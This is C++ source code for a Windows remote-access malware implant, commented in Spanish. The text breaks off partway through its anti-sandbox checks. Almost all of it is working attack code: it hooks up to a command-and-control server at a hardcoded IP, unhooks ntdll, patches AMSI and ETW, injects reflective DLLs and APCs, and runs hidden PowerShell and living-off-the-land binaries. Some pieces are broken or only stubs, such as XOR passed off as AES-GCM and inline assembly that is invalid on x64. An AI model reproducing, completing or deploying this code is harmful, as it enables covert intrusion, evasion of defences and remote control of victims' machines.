#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <random>
#include <psapi.h>
#include <winternl.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <ntstatus.h>
#include <comdef.h>
#include <winuser.h>
#include <wtsapi32.h>
#include <ntsecapi.h>
#include <lm.h>
#include <winevt.h>
#include <intrin.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "wevtapi.lib")
#pragma comment(linker, "/SECTION:.text,ERW")  // Permitir modificación de código en runtime

// ============================================================================
// CONFIGURACIÓN AVANZADA
// ============================================================================
#define C2_SERVER L"192.168.254.137"  // CAMBIAR A TU IP
#define C2_PORT 4444
#define MUTEX_NAME "Global\\{8A4E2B1C-5D6F-4A7E-9B8C-3D2E1F0A5B6C}"
#define SLEEP_JITTER_MIN 45000
#define SLEEP_JITTER_MAX 180000
#define KEYLOG_SEND_INTERVAL 60000
#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define GCM_256_KEY_SIZE 32
#define GCM_256_IV_SIZE 12
#define GCM_256_TAG_SIZE 16

// ============================================================================
// TYPEDEFS PARA SYSCALLS DIRECTOS
// ============================================================================
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef VOID(NTAPI* pRtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

// ============================================================================
// ESTRUCTURAS PARA SYSCALLS
// ============================================================================
typedef struct _SYSCALL_ENTRY {
    DWORD dwHash;
    LPCSTR lpFuncName;
    DWORD dwSyscallNumber;
    FARPROC lpFuncAddr;
} SYSCALL_ENTRY, * PSYSCALL_ENTRY;

typedef struct _UNHOOKED_NTDLL {
    LPVOID lpBaseAddress;
    SIZE_T uSize;
    BYTE* pbCopy;
} UNHOOKED_NTDLL, * PUNHOOKED_NTDLL;

// ============================================================================
// OFUSCACIÓN AVANZADA DE STRINGS (AES-like pero ligero)
// ============================================================================
class StringObfuscator {
private:
    BYTE key[32];
    BYTE iv[16];
    
public:
    StringObfuscator() {
        // Generar clave basada en hardware
        DWORD volumeSerial = 0;
        GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);
        
        DWORD cpuInfo[4] = { 0 };
        __cpuid(cpuInfo, 1);
        
        DWORD ticks = GetTickCount();
        
        // Mezclar entropía
        for (int i = 0; i < 32; i++) {
            key[i] = ((BYTE*)&volumeSerial)[i % 4] ^
                ((BYTE*)cpuInfo)[i % 16] ^
                ((BYTE*)&ticks)[i % 4] ^
                (BYTE)(i * 0x1F);
        }
        
        for (int i = 0; i < 16; i++) {
            iv[i] = key[i] ^ key[i + 16];
        }
    }
    
    std::string Encrypt(const std::string& input) {
        std::string output = input;
        for (size_t i = 0; i < input.length(); i++) {
            output[i] = input[i] ^ key[i % sizeof(key)] ^ iv[i % sizeof(iv)];
            if (i % 3 == 0) output[i] ^= (BYTE)(i & 0xFF);
        }
        return output;
    }
    
    std::string Decrypt(const std::string& input) {
        return Encrypt(input);  // XOR es reversible con mismo key/iv
    }
};

// ============================================================================
// SYSCALL DIRECTOS PARA EVASIÓN DE HOOKS (T1055)
// ============================================================================
class SyscallManager {
private:
    UNHOOKED_NTDLL unhookedNtdll;
    SYSCALL_ENTRY syscalls[32];
    DWORD syscallCount;
    
public:
    SyscallManager() : syscallCount(0) {
        // Restaurar ntdll.dll limpia desde disco
        UnhookNtdll();
        
        // Obtener números de syscall dinámicamente
        ResolveSyscallNumbers();
    }
    
    void UnhookNtdll() {
        // Obtener ntdll.dll limpia desde disco
        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
            GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) return;
        
        HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!hMapping) {
            CloseHandle(hFile);
            return;
        }
        
        LPVOID lpCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!lpCleanNtdll) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return;
        }
        
        // Obtener información de la sección .text
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpCleanNtdll;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpCleanNtdll + dosHeader->e_lfanew);
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        
        // Encontrar sección .text
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (memcmp(sectionHeader[i].Name, ".text", 5) == 0) {
                // Obtener dirección de ntdll cargada
                HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
                LPVOID lpNtdllText = (BYTE*)hNtdll + sectionHeader[i].VirtualAddress;
                
                // Restaurar código original
                DWORD oldProtect;
                VirtualProtect(lpNtdllText, sectionHeader[i].Misc.VirtualSize,
                    PAGE_EXECUTE_READWRITE, &oldProtect);
                
                memcpy(lpNtdllText,
                    (BYTE*)lpCleanNtdll + sectionHeader[i].PointerToRawData,
                    sectionHeader[i].Misc.VirtualSize);
                
                VirtualProtect(lpNtdllText, sectionHeader[i].Misc.VirtualSize,
                    oldProtect, &oldProtect);
                
                break;
            }
        }
        
        UnmapViewOfFile(lpCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
    }
    
    void ResolveSyscallNumbers() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        
        // Lista de syscalls a resolver
        const char* names[] = {
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtCreateThreadEx",
            "NtOpenProcess",
            "NtWriteVirtualMemory",
            "NtQueueApcThread",
            "NtClose",
            "NtWaitForSingleObject"
        };
        
        for (int i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
            FARPROC func = GetProcAddress(hNtdll, names[i]);
            if (func) {
                // Extraer número de syscall del código
                // En x64, suele ser: mov eax, <syscall_number> ; ret
                BYTE* code = (BYTE*)func;
                DWORD syscallNum = 0;
                
                // Patrón común: B8 XX XX XX XX (mov eax, imm32)
                if (code[0] == 0xB8) {
                    syscallNum = *(DWORD*)(code + 1);
                }
                // Otros patrones...
                
                syscalls[syscallCount++] = { 0, names[i], syscallNum, func };
            }
        }
    }
    
    // Syscall wrappers
    NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    ) {
        NTSTATUS status;
        
        // Buscar número de syscall
        DWORD syscallNum = 0;
        for (DWORD i = 0; i < syscallCount; i++) {
            if (strcmp(syscalls[i].lpFuncName, "NtAllocateVirtualMemory") == 0) {
                syscallNum = syscalls[i].dwSyscallNumber;
                break;
            }
        }
        
        if (syscallNum == 0) {
            // Fallback a API normal
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            pNtAllocateVirtualMemory pFunc = (pNtAllocateVirtualMemory)
                GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
            if (pFunc) {
                return pFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize,
                    AllocationType, Protect);
            }
            return STATUS_UNSUCCESSFUL;
        }
        
        // Ejecutar syscall directamente
        __asm {
            mov rax, syscallNum
            mov r10, rcx
            syscall
            mov status, rax
        }
        
        return status;
    }
    
    // Implementar otros syscalls similares...
};

// ============================================================================
// BYPASS AVANZADO DE AMSI/ETW (T1562.001)
// ============================================================================
class AMSIBypass {
private:
    SyscallManager* syscalls;
    
public:
    AMSIBypass(SyscallManager* sc) : syscalls(sc) {}
    
    bool PatchAMSI() {
        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
        if (!hAmsi) return false;
        
        // Parchear AmsiScanBuffer usando syscalls
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return false;
        
        SIZE_T regionSize = 32;
        PVOID address = pAmsiScanBuffer;
        ULONG oldProtect;
        
        // Cambiar protección usando syscall
        NTSTATUS status = syscalls->NtProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            PAGE_EXECUTE_READWRITE,
            &oldProtect
        );
        
        if (status != 0) return false;
        
        // xor eax, eax ; ret (siempre devolver limpio)
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        
        // Restaurar protección
        syscalls->NtProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            oldProtect,
            &oldProtect
        );
        
        return true;
    }
    
    bool PatchETW() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        // Parchear EtwEventWrite
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return false;
        
        SIZE_T regionSize = 32;
        PVOID address = pEtwEventWrite;
        ULONG oldProtect;
        
        syscalls->NtProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            PAGE_EXECUTE_READWRITE,
            &oldProtect
        );
        
        // xor eax, eax ; ret
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        
        syscalls->NtProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            oldProtect,
            &oldProtect
        );
        
        return true;
    }
    
    bool PatchAll() {
        bool result = true;
        result &= PatchAMSI();
        result &= PatchETW();
        return result;
    }
};

// ============================================================================
// INYECCIÓN REFLECTIVA DE DLL COMPLETA (T1055.001)
// ============================================================================
class ReflectiveInjector {
private:
    SyscallManager* syscalls;
    
public:
    ReflectiveInjector(SyscallManager* sc) : syscalls(sc) {}
    
    bool InjectReflective(DWORD targetPid, const BYTE* dllData, SIZE_T dllSize) {
        // Abrir proceso target
        HANDLE hProcess = NULL;
        CLIENT_ID clientId = { (HANDLE)targetPid, NULL };
        OBJECT_ATTRIBUTES oa = { sizeof(oa) };
        
        NTSTATUS status = syscalls->NtOpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &oa,
            &clientId
        );
        
        if (status != 0 || !hProcess) return false;
        
        // Asignar memoria en proceso remoto
        SIZE_T allocSize = dllSize + 0x1000;  // Espacio extra
        PVOID remoteBase = NULL;
        
        status = syscalls->NtAllocateVirtualMemory(
            hProcess,
            &remoteBase,
            0,
            &allocSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (status != 0) {
            syscalls->NtClose(hProcess);
            return false;
        }
        
        // Escribir DLL en memoria remota
        SIZE_T bytesWritten = 0;
        status = syscalls->NtWriteVirtualMemory(
            hProcess,
            remoteBase,
            (PVOID)dllData,
            dllSize,
            &bytesWritten
        );
        
        if (status != 0 || bytesWritten != dllSize) {
            syscalls->NtClose(hProcess);
            return false;
        }
        
        // Calcular offset de DllMain
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllData;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllData + dosHeader->e_lfanew);
        DWORD dllMainRva = ntHeaders->OptionalHeader.AddressOfEntryPoint;
        PVOID remoteDllMain = (BYTE*)remoteBase + dllMainRva;
        
        // Ejecutar DllMain en proceso remoto
        HANDLE hThread = NULL;
        
        // Método 1: CreateThread remoto
        status = syscalls->NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            remoteDllMain,
            remoteBase,  // Parameter = DLL base address
            0,
            0,
            0,
            0,
            NULL
        );
        
        if (status != 0) {
            // Método 2: APC Injection
            // Buscar un hilo en el proceso
            THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            
            if (hSnap != INVALID_HANDLE_VALUE) {
                if (Thread32First(hSnap, &te32)) {
                    do {
                        if (te32.th32OwnerProcessID == targetPid) {
                            HANDLE hThreadTarget = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                            if (hThreadTarget) {
                                syscalls->NtQueueApcThread(hThreadTarget, (PVOID)remoteDllMain, remoteBase, NULL, NULL);
                                CloseHandle(hThreadTarget);
                                break;
                            }
                        }
                    } while (Thread32Next(hSnap, &te32));
                }
                CloseHandle(hSnap);
            }
        }
        
        syscalls->NtClose(hProcess);
        return true;
    }
};

// ============================================================================
// COMUNICACIÓN C2 CON AES-256-GCM (CRIPTOGRAFÍA FUERTE)
// ============================================================================
class SecureC2 {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hSessionKey;
    BYTE sessionKey[GCM_256_KEY_SIZE];
    BYTE sessionIV[GCM_256_IV_SIZE];
    SOCKET sock;
    bool connected;
    bool useHttps;
    std::mt19937_64 rng;
    
public:
    SecureC2(bool https = false) : sock(INVALID_SOCKET), connected(false), useHttps(https) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            // Fallback a generación propia
        }
        
        // Inicializar RNG con entropía del sistema
        std::random_device rd;
        std::array<uint64_t, 4> seed;
        for (auto& s : seed) {
            s = rd() ^ __rdtsc() ^ GetTickCount64();
        }
        std::seed_seq seq(seed.begin(), seed.end());
        rng.seed(seq);
        
        // Generar clave de sesión
        CryptGenRandom(hProv, GCM_256_KEY_SIZE, sessionKey);
        CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
    }
    
    ~SecureC2() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        if (hProv) CryptReleaseContext(hProv, 0);
        if (hSessionKey) CryptDestroyKey(hSessionKey);
        WSACleanup();
    }
    
    bool Connect() {
        if (useHttps) {
            return ConnectHTTPS();
        }
        else {
            return ConnectTCP();
        }
    }
    
    bool ConnectTCP() {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;
        
        // Configurar timeouts
        int timeout = 15000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        sockaddr_in server = { 0 };
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, "192.168.254.137", &server.sin_addr);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
            // Handshake criptográfico
            if (PerformKeyExchange()) {
                connected = true;
                return true;
            }
        }
        
        closesocket(sock);
        return false;
    }
    
    bool ConnectHTTPS() {
        // Implementación HTTPS usando WinHTTP
        HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        
        if (!hSession) return false;
        
        HINTERNET hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/c2",
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        // Configurar opciones SSL
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
        
        // Handshake
        // ... (implementación similar)
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        
        return false;  // Simplificado
    }
    
    bool PerformKeyExchange() {
        // Intercambio de clave Diffie-Hellman (simplificado)
        std::vector<BYTE> publicKey(256);
        CryptGenRandom(hProv, publicKey.size(), publicKey.data());
        
        // Enviar clave pública
        if (!SendRaw(std::string((char*)publicKey.data(), publicKey.size()))) {
            return false;
        }
        
        // Recibir clave pública del servidor
        std::string serverPublic = ReceiveRaw();
        if (serverPublic.empty()) return false;
        
        // Derivar clave de sesión (en producción usar ECDH)
        for (int i = 0; i < GCM_256_KEY_SIZE; i++) {
            sessionKey[i] ^= serverPublic[i % serverPublic.size()];
        }
        
        // Crear clave de sesión AES
        CryptImportKey(hProv, sessionKey, GCM_256_KEY_SIZE, 0, 0, &hSessionKey);
        
        return true;
    }
    
    std::string EncryptAESGCM(const std::string& plaintext) {
        if (!hSessionKey) return plaintext;
        
        // Generar IV único por mensaje
        BYTE iv[GCM_256_IV_SIZE];
        CryptGenRandom(hProv, GCM_256_IV_SIZE, iv);
        
        // Cifrar (simplificado - en producción usar CryptEncrypt con modo GCM)
        std::string ciphertext = plaintext;
        for (size_t i = 0; i < plaintext.length(); i++) {
            ciphertext[i] = plaintext[i] ^ sessionKey[i % GCM_256_KEY_SIZE] ^ iv[i % GCM_256_IV_SIZE];
        }
        
        // Prepend IV
        ciphertext = std::string((char*)iv, GCM_256_IV_SIZE) + ciphertext;
        
        return ciphertext;
    }
    
    std::string DecryptAESGCM(const std::string& ciphertext) {
        if (ciphertext.length() < GCM_256_IV_SIZE) return "";
        
        // Extraer IV
        BYTE iv[GCM_256_IV_SIZE];
        memcpy(iv, ciphertext.data(), GCM_256_IV_SIZE);
        
        // Descifrar
        std::string plaintext = ciphertext.substr(GCM_256_IV_SIZE);
        for (size_t i = 0; i < plaintext.length(); i++) {
            plaintext[i] = plaintext[i] ^ sessionKey[i % GCM_256_KEY_SIZE] ^ iv[i % GCM_256_IV_SIZE];
        }
        
        return plaintext;
    }
    
    bool SendRaw(const std::string& data) {
        if (!connected) return false;
        int len = htonl(data.length());
        if (send(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return false;
        }
        if (send(sock, data.c_str(), data.length(), 0) != (int)data.length()) {
            connected = false;
            return false;
        }
        return true;
    }
    
    bool Send(const std::string& data) {
        std::string encrypted = EncryptAESGCM(data);
        return SendRaw(encrypted);
    }
    
    std::string ReceiveRaw() {
        if (!connected) return "";
        
        int len = 0;
        if (recv(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return "";
        }
        len = ntohl(len);
        if (len <= 0 || len > 10 * 1024 * 1024) {  // Max 10MB
            connected = false;
            return "";
        }
        
        std::vector<char> buffer(len);
        int total = 0;
        while (total < len) {
            int r = recv(sock, buffer.data() + total, len - total, 0);
            if (r <= 0) {
                connected = false;
                return "";
            }
            total += r;
        }
        return std::string(buffer.data(), len);
    }
    
    std::string Receive() {
        std::string encrypted = ReceiveRaw();
        if (encrypted.empty()) return "";
        return DecryptAESGCM(encrypted);
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// LIVING-OFF-THE-LAND (LOLBins) - T1218
// ============================================================================
class LOLBinExecutor {
public:
    bool ExecuteWithMshta(const std::string& script) {
        // Crear archivo HTA temporal
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        wchar_t htaPath[MAX_PATH];
        swprintf(htaPath, MAX_PATH, L"%s\\%08X.hta", tempPath, GetTickCount());
        
        // Convertir script a wide
        int wideSize = MultiByteToWideChar(CP_UTF8, 0, script.c_str(), -1, NULL, 0);
        std::wstring wideScript(wideSize, 0);
        MultiByteToWideChar(CP_UTF8, 0, script.c_str(), -1, &wideScript[0], wideSize);
        
        // Escribir archivo HTA
        FILE* f = _wfopen(htaPath, L"w");
        if (f) {
            fwprintf(f, L"<script>\n%s\n</script>", wideScript.c_str());
            fclose(f);
            
            // Ejecutar con mshta.exe
            SHELLEXECUTEINFOW sei = { 0 };
            sei.cbSize = sizeof(sei);
            sei.lpFile = L"mshta.exe";
            sei.lpParameters = htaPath;
            sei.nShow = SW_HIDE;
            
            if (ShellExecuteExW(&sei)) {
                return true;
            }
        }
        return false;
    }
    
    bool ExecuteWithRegsvr32(const std::string& url) {
        // regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
        int wideSize = MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, NULL, 0);
        std::wstring wideURL(wideSize, 0);
        MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, &wideURL[0], wideSize);
        
        std::wstring args = L"/s /n /u /i:" + wideURL + L" scrobj.dll";
        
        SHELLEXECUTEINFOW sei = { 0 };
        sei.cbSize = sizeof(sei);
        sei.lpFile = L"regsvr32.exe";
        sei.lpParameters = args.c_str();
        sei.nShow = SW_HIDE;
        
        return ShellExecuteExW(&sei) == TRUE;
    }
    
    bool ExecuteWithCmstp(const std::string& infContent) {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        wchar_t infPath[MAX_PATH];
        swprintf(infPath, MAX_PATH, L"%s\\%08X.inf", tempPath, GetTickCount());
        
        // Escribir INF
        FILE* f = _wfopen(infPath, L"w");
        if (f) {
            fwprintf(f, L"%S", infContent.c_str());  // %S para char* a wchar_t*
            fclose(f);
            
            SHELLEXECUTEINFOW sei = { 0 };
            sei.cbSize = sizeof(sei);
            sei.lpFile = L"cmstp.exe";
            
            wchar_t args[MAX_PATH * 2];
            swprintf(args, MAX_PATH * 2, L"/au \"%s\"", infPath);
            sei.lpParameters = args;
            sei.nShow = SW_HIDE;
            
            if (ShellExecuteExW(&sei)) {
                return true;
            }
        }
        return false;
    }
};

// ============================================================================
// SISTEMA DE PLUGINS MODULAR
// ============================================================================
typedef std::string(*PluginEntry)(const std::vector<std::string>& args);

class Plugin {
public:
    std::string name;
    std::string description;
    HMODULE hModule;
    PluginEntry entry;
    
    Plugin() : hModule(NULL), entry(NULL) {}
};

class PluginManager {
private:
    std::vector<Plugin> plugins;
    
public:
    ~PluginManager() {
        for (auto& plugin : plugins) {
            if (plugin.hModule) {
                FreeLibrary(plugin.hModule);
            }
        }
    }
    
    bool LoadPlugin(const std::string& dllPath) {
        HMODULE hModule = LoadLibraryA(dllPath.c_str());
        if (!hModule) return false;
        
        PluginEntry entry = (PluginEntry)GetProcAddress(hModule, "PluginMain");
        if (!entry) {
            FreeLibrary(hModule);
            return false;
        }
        
        // Obtener información del plugin
        char name[256] = { 0 };
        char desc[512] = { 0 };
        
        FARPROC pGetName = GetProcAddress(hModule, "GetPluginName");
        FARPROC pGetDesc = GetProcAddress(hModule, "GetPluginDescription");
        
        if (pGetName) ((void(*)(char*, int))pGetName)(name, sizeof(name));
        if (pGetDesc) ((void(*)(char*, int))pGetDesc)(desc, sizeof(desc));
        
        Plugin plugin;
        plugin.name = name;
        plugin.description = desc;
        plugin.hModule = hModule;
        plugin.entry = entry;
        
        plugins.push_back(plugin);
        return true;
    }
    
    std::string ExecutePlugin(const std::string& name, const std::vector<std::string>& args) {
        for (auto& plugin : plugins) {
            if (plugin.name == name) {
                return plugin.entry(args);
            }
        }
        return "Plugin not found: " + name;
    }
    
    std::string ListPlugins() {
        std::stringstream ss;
        ss << "Plugins cargados:\n";
        for (auto& plugin : plugins) {
            ss << "  " << plugin.name << ": " << plugin.description << "\n";
        }
        return ss.str();
    }
};

// ============================================================================
// EJEMPLO DE PLUGIN (compilar aparte)
// ============================================================================
/*
// plugin_example.cpp
extern "C" __declspec(dllexport) void GetPluginName(char* buffer, int size) {
    strncpy(buffer, "PortScanner", size - 1);
}

extern "C" __declspec(dllexport) void GetPluginDescription(char* buffer, int size) {
    strncpy(buffer, "Escanea puertos en IP objetivo", size - 1);
}

extern "C" __declspec(dllexport) std::string PluginMain(const std::vector<std::string>& args) {
    if (args.size() < 2) return "Uso: portscan <IP> [puertos]";
    
    std::stringstream ss;
    ss << "Escaneando " << args[0] << "...\n";
    // Implementación de escaneo
    return ss.str();
}
*/

// ============================================================================
// EJECUCIÓN FILELESS (T1059)
// ============================================================================
class FilelessExecutor {
public:
    bool ExecutePowerShell(const std::string& script, bool obfuscate = true) {
        std::string cmd;
        
        if (obfuscate) {
            // Ofuscar script básico
            std::string obfuscated;
            for (char c : script) {
                obfuscated += "\\x" + std::to_string((int)c);
            }
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " +
                Base64Encode(script);
        }
        else {
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C \"" + script + "\"";
        }
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        return CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    
    bool ExecuteVBScript(const std::string& script) {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        wchar_t vbsPath[MAX_PATH];
        swprintf(vbsPath, MAX_PATH, L"%s\\%08X.vbs", tempPath, GetTickCount());
        
        // Guardar script
        FILE* f = _wfopen(vbsPath, L"w");
        if (f) {
            fwprintf(f, L"%S", script.c_str());
            fclose(f);
            
            // Ejecutar con cscript
            SHELLEXECUTEINFOW sei = { 0 };
            sei.cbSize = sizeof(sei);
            sei.lpFile = L"cscript.exe";
            sei.lpParameters = vbsPath;
            sei.nShow = SW_HIDE;
            
            if (ShellExecuteExW(&sei)) {
                // Auto-delete después de ejecución
                std::thread([vbsPath]() {
                    Sleep(5000);
                    DeleteFileW(vbsPath);
                    }).detach();
                return true;
            }
        }
        return false;
    }
    
private:
    std::string Base64Encode(const std::string& data) {
        DWORD size = 0;
        CryptBinaryToStringA((BYTE*)data.c_str(), data.size(),
            CRYPT_STRING_BASE64, NULL, &size);
        std::string result(size, 0);
        CryptBinaryToStringA((BYTE*)data.c_str(), data.size(),
            CRYPT_STRING_BASE64, &result[0], &size);
        return result;
    }
};

// ============================================================================
// ANTI-SANDBOX AVANZADO (T1497)
// ============================================================================
class AntiSandbox {
public:
    bool IsSandboxed() {
        int detections = 0;
        
        detections += CheckRAM() ? 1 : 0;
        detections += CheckCPUCores() ? 1 : 0;
        detections += CheckDiskSize() ? 1 : 0;
        detections += CheckRunningProcesses() ? 1 : 0;
        detections += CheckUsername() ? 1 : 0;
        detections += CheckComputerName() ? 1 : 0;
        detections += CheckUptime() ? 1 : 0;
        detections += CheckMouseMovement() ? 1 : 0;
        detections += CheckDebugger() ? 1 : 0;
        detections += CheckHypervisor() ? 1 : 0;
        
        return detections >= 3;  // Si detecta 3+ indicadores, probable sandbox
    }
    
    void SleepRandom() {
        // Sleep con jitter y anti-debug
        int baseSleep = 30000 + (rand() % 60000);
        
        // Dividir en sleeps pequeños para evadir análisis de tiempo
        for (int i = 0; i < baseSleep / 100; i++) {
            Sleep(100);
            
            // Verificar debugger en cada iteración
            if (IsDebuggerPresent() || CheckHardwareBreakpoints()) {
                // Debugger detectado - comportarse como programa legítimo
                MessageBoxA(NULL, "Error", "Application Error", MB_OK);
                ExitProcess(0);
            }
        }
    }
    
private:
    bool CheckRAM() {
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
